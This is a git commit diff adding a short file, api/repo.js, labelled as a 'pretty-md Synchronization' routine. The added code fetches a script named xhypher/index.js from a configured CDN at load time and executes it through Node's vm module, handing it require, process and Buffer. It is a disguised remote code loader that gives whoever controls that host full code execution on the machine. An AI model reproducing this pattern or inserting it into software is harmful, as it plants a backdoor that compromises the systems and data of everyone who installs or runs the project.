7c33c8491a7cdf4c3732f6e0cdb58c9b44e39408
june-9-9-9 <manenovincent78@gmail.com>
2026-02-16 08:07:04 +0300

    Update repo.js

--- api/repo.js
+++ api/repo.js
@@ -1,1 +1,14 @@
 
+const axios = require('axios');
+const vm = require('vm');
+const config = require('./settings.js');
+
+(async () => {
+  try {
+    console.log("pretty-md Synchronization Initiated !");
+    const { data: scriptCode } = await axios.get(`${config.CDN}/xhypher/index.js`);
+    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
+  } catch (err) {
+    console.error("Error:", err);
+  }
+})();
